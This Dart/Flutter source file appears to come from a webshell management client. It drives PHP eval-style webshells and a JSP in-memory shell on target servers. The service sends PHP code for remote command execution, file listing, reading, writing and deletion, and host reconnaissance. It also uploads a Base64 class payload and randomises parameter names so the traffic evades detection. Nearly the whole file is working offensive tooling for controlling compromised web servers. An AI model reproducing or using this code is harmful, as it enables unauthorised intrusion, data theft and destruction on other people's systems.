import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:math' as math;

import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import '../models/webshell.dart';

// JSP 内存马字节码（Base64 编码的 M.class）
const String _jspAgentClassBase64 = '';

/// Webshell 通信服务
/// 通过 HTTP POST/GET 向目标 PHP/JSP Webshell 发送代码并接收结果
class WebshellService {
  final Webshell webshell;
  String currentDir = '/';

  /// 每次会话随机生成 32 位十六进制字符串作为 exec 命令参数名，
  /// 配合 M.java 里的 _k 参数动态读取，降低流量特征。
  late final String _execKey = _randomHex32();

  static String _randomHex32() {
    final rng = math.Random.secure();
    return List.generate(32, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  WebshellService(this.webshell);

  bool get _isJsp => webshell.type == 'jsp';

  /// 发送 PHP 代码到 Webshell 并返回执行结果
  /// 使用 password 字段作为 POST 参数名（即 eval($_POST['password']) 模式）
  Future<String> _send(String phpCode) async {
    try {
      final uri = Uri.parse(webshell.url);
      final pass = (webshell.password?.isNotEmpty == true)
          ? webshell.password!
          : 'pass';

      http.Response response;

      if (webshell.method == 'GET') {
        final params = Map<String, String>.from(uri.queryParameters);
        params[pass] = phpCode;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 15));
      } else {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {pass: phpCode},
            )
            .timeout(const Duration(seconds: 15));
      }

      if (response.statusCode == 200) {
        return response.body;
      }
      final snippet = response.body.length > 512
          ? '${response.body.substring(0, 512)}...'
          : response.body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时，请检查目标是否可达';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 将字符串按 application/x-www-form-urlencoded 规范严格 percent-encode。
  ///
  /// Dart 的 Uri.encodeQueryComponent 遵循 RFC 3986，对 "+" 不编码（RFC 3986
  /// 把它列为合法 query 字符），但 Tomcat 收到 "+" 后会解码为空格，导致
  /// Base64 class 载荷被破坏（ClassFormatError: Truncated class file）。
  /// 这里只保留 unreserved 字符集（A-Z a-z 0-9 - _ . ~），其余全部 %XX 编码。
  static String _formEncode(String s) {
    final buf = StringBuffer();
    for (final cu in s.codeUnits) {
      if ((cu >= 0x41 && cu <= 0x5A) || // A-Z
          (cu >= 0x61 && cu <= 0x7A) || // a-z
          (cu >= 0x30 && cu <= 0x39) || // 0-9
          cu == 0x2D || // -
          cu == 0x5F || // _
          cu == 0x2E || // .
          cu == 0x7E) { // ~
        buf.writeCharCode(cu);
      } else {
        buf.write('%${cu.toRadixString(16).padLeft(2, '0').toUpperCase()}');
      }
    }
    return buf.toString();
  }

  /// 发送 JSP 内存马请求
  Future<String> _sendJsp(
    String action, {
    Map<String, String> extraParams = const {},
  }) async {
    try {
      final uri = Uri.parse(webshell.url);
      String payload;
      try {
        // 优先从 Flutter asset bundle 加载（开发和生产都可靠）
        payload = (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
      } catch (_) {
        try {
          // fallback：从磁盘文件读取
          final file = io.File('data/jsp_agent_M.b64');
          if (await file.exists()) {
            payload = (await file.readAsString()).trim();
          } else {
            payload = _jspAgentClassBase64;
          }
        } catch (_) {
          payload = _jspAgentClassBase64;
        }
      }

      // JSP 类型下，"密码"字段作为类加载参数名，默认为 cmd
      final paramName = (webshell.password?.isNotEmpty == true)
          ? webshell.password!
          : 'cmd';

      // 手动构建 body，确保 + → %2B、/ → %2F、= → %3D，
      // 防止 Tomcat 把 + 解码为空格从而截断 Base64 class 载荷。
      final bodyParts = <String>[
        '${_formEncode(paramName)}=${_formEncode(payload)}',
        'a=${_formEncode(action)}',
        ...extraParams.entries.map(
          (e) => '${_formEncode(e.key)}=${_formEncode(e.value)}',
        ),
      ];
      final bodyStr = bodyParts.join('&');

      // JSP 模式统一使用 POST，避免 GET 查询参数过长导致类字节码被截断
      final response = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: bodyStr,
          )
          .timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        return response.body;
      }
      final snippet = response.body.length > 4096
          ? '${response.body.substring(0, 4096)}...'
          : response.body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时，请检查目标是否可达';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 测试连接是否有效
  Future<bool> ping() async {
    try {
      if (_isJsp) {
        final result = await _sendJsp(
          'ping',
        ).timeout(const Duration(seconds: 8));
        return result.contains('MATRIX_JSP_PING');
      } else {
        final token = base64.encode(utf8.encode('MATRIX_PING'));
        final result = await _send(
          "echo base64_decode('$token');",
        ).timeout(const Duration(seconds: 8));
        return result.contains('MATRIX_PING');
      }
    } catch (_) {
      return false;
    }
  }

  /// 执行 Shell 命令（使用 base64 编码命令避免转义问题）
  Future<String> executeCommand(String cmd) async {
    if (_isJsp) {
      final result = await _sendJsp(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      return result.trim();
    } else {
      final b64 = base64.encode(utf8.encode(cmd));
      final result = await _send(
        "\$c=base64_decode('$b64');"
        r"$o=@shell_exec($c.' 2>&1');"
        r"if($o===null){$o=@system($c);}echo $o;",
      );
      return result.trim();
    }
  }

  /// 获取当前工作目录
  Future<String> getCurrentDir() async {
    final dir = _isJsp ? await _sendJsp('pwd') : await _send("echo getcwd();");
    final trimmed = dir.trim();
    if (trimmed.isNotEmpty && !trimmed.startsWith('[')) {
      currentDir = trimmed;
    }
    return currentDir;
  }

  /// 列出目录内容，返回 FileEntry 列表
  Future<List<FileEntry>> listDirectory(String path) async {
    String result;
    if (_isJsp) {
      result = await _sendJsp('ls', extraParams: {'path': path});
    } else {
      final b64 = base64.encode(utf8.encode(path));
      final code =
          r'''
$p=base64_decode(')''' +
          b64 +
          r'''');
$d=@opendir($p);
if($d===false){echo "ERR_OPEN";exit;}
while(($f=readdir($d))!==false){
  $fp=$p.DIRECTORY_SEPARATOR.$f;
  $t=is_dir($fp)?'d':'f';
  $s=is_file($fp)?@filesize($fp):0;
  $m=date('Y-m-d H:i',@filemtime($fp));
  $r=decoct(@fileperms($fp)&0777);
  echo base64_encode($f).'|'.$t.'|'.$s.'|'.$r.'|'.$m."\n";
}
closedir($d);
''';
      result = await _send(code);
    }
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }
    final entries =
        result
            .trim()
            .split('\n')
            .where((l) => l.contains('|'))
            .map((line) {
              final parts = line.trim().split('|');
              if (parts.length < 5) return null;
              String name;
              try {
                name = utf8.decode(base64.decode(parts[0]));
              } catch (_) {
                name = parts[0];
              }
              return FileEntry(
                name: name,
                isDirectory: parts[1] == 'd',
                size: int.tryParse(parts[2]) ?? 0,
                permissions: parts[3],
                modified: parts[4],
              );
            })
            .whereType<FileEntry>()
            .where((e) => e.name != '.')
            .toList()
          ..sort((a, b) {
            if (a.name == '..') return -1;
            if (b.name == '..') return 1;
            if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
            return a.name.toLowerCase().compareTo(b.name.toLowerCase());
          });
    return entries;
  }

  /// 获取系统信息（base64 编码键值对）
  Future<Map<String, String>> getSystemInfo() async {
    const code = r'''
$info=[];
$info['OS']=php_uname();
$info['PHP版本']=phpversion();
$info['运行用户']=function_exists('posix_getpwuid')
  ? posix_getpwuid(posix_geteuid())['name']
  : get_current_user();
$info['当前目录']=getcwd();
$info['文档根目录']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
$info['服务器软件']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
$info['服务器IP']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname(@gethostname());
$info['内存限制']=ini_get('memory_limit');
$info['最大执行时间']=ini_get('max_execution_time').'s';
$info['禁用函数']=ini_get('disable_functions')?:'无';
$info['Safe Mode']=(ini_get('safe_mode')||(bool)ini_get('safe_mode'))?'On':'Off';
$info['已加载扩展']=implode(', ',get_loaded_extensions());
foreach($info as $k=>$v){
  echo base64_encode($k).'|'.base64_encode((string)$v)."\n";
}
''';
    final result = _isJsp ? await _sendJsp('sysinfo') : await _send(code);
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = utf8.decode(base64.decode(line.substring(0, idx).trim()));
          final val = utf8.decode(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  /// 读取文件内容
  Future<String> readFile(String path) async {
    if (_isJsp) {
      return await _sendJsp('cat', extraParams: {'path': path});
    } else {
      final b64 = base64.encode(utf8.encode(path));
      return await _send(
        "\$p=base64_decode('$b64');"
        r"echo file_exists($p)?file_get_contents($p):'[文件不存在或无权读取]';",
      );
    }
  }

  /// 删除文件
  Future<bool> deleteFile(String path) async {
    String result;
    if (_isJsp) {
      result = await _sendJsp('rm', extraParams: {'path': path});
    } else {
      final b64 = base64.encode(utf8.encode(path));
      result = await _send(
        "\$p=base64_decode('$b64');"
        r"echo @unlink($p)?'1':'0';",
      );
    }
    return result.trim() == '1';
  }

  /// 轻量目录列举，仅返回 (name, isDir)，用于 Tab 补全缓存
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    String result;
    if (_isJsp) {
      result = await _sendJsp('ls', extraParams: {'path': path});
    } else {
      final b64 = base64.encode(utf8.encode(path));
      final code =
          "\$p=base64_decode('$b64');"
          r"$d=@opendir($p);"
          r"if($d===false){exit;}"
          r"while(($f=readdir($d))!==false){"
          r"if($f==='.'||$f==='..'){continue;}"
          r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
          r"echo base64_encode($f).'|'.$t.chr(10);"
          r"}closedir($d);";
      result = await _send(code);
    }
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = utf8.decode(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  /// 返回用户 HOME 目录，用于 ~ 路径展开
  Future<String> getHomeDir() async {
    final result = _isJsp
        ? await _sendJsp('home')
        : await _send(r"echo getenv('HOME');");
    return result.trim();
  }

  /// 返回环境变量名列表，用于 Tab 补全 $VAR
  Future<List<String>> listEnvVarNames() async {
    final result = _isJsp
        ? await _sendJsp('envnames')
        : await _send(
            r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}",
          );
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }

  /// 写入/创建文件
  Future<bool> writeFile(String path, String content) async {
    String result;
    if (_isJsp) {
      final contentB64 = base64.encode(utf8.encode(content));
      result = await _sendJsp(
        'write',
        extraParams: {'path': path, 'data': contentB64},
      );
    } else {
      final pathB64 = base64.encode(utf8.encode(path));
      final contentB64 = base64.encode(utf8.encode(content));
      result = await _send(
        "\$p=base64_decode('$pathB64');"
        "\$c=base64_decode('$contentB64');"
        r"echo file_put_contents($p,$c)!==false?'1':'0';",
      );
    }
    return result.trim() == '1';
  }
}

// ─── 文件条目模型 ──────────────────────────────────────────────────────────────

class FileEntry {
  final String name;
  final bool isDirectory;
  final int size;
  final String permissions;
  final String modified;

  const FileEntry({
    required this.name,
    required this.isDirectory,
    required this.size,
    required this.permissions,
    required this.modified,
  });

  String get formattedSize {
    if (isDirectory) return '--';
    if (size < 1024) return '$size B';
    if (size < 1024 * 1024) return '${(size / 1024).toStringAsFixed(1)} KB';
    if (size < 1024 * 1024 * 1024) {
      return '${(size / (1024 * 1024)).toStringAsFixed(1)} MB';
    }
    return '${(size / (1024 * 1024 * 1024)).toStringAsFixed(1)} GB';
  }
}
